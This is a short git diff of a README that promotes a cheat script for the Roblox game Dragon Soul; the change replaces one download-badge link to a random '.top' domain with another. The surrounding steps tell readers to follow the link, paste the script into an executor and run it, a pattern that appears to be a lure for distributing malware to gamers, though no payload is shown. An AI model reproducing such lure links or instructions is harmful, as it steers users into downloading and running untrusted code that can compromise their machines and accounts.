@@ -64,9 +64,7 @@ Choosing this Dragon Soul script gives you access to:
 1. Open Roblox and launch **Dragon Soul**
 2. Click the button below to go to the download page:
 
-```bash
-[![Get the Script Now](https://img.shields.io/badge/Download%20Gamepass%20Script-%E2%86%92-brightgreen?style=for-the-badge&logo=roblox)](https://ti8ujl.top/gamepass)
-```
+[![Get the Script Now](https://img.shields.io/badge/Download%20Dragon%20Soul%20Script-%E2%86%92-brightgreen?style=for-the-badge&logo=roblox)](https://3wi39t.top/dragonsoul)
 
 3. Paste the script into your executor
 4. Execute and enable your preferred features
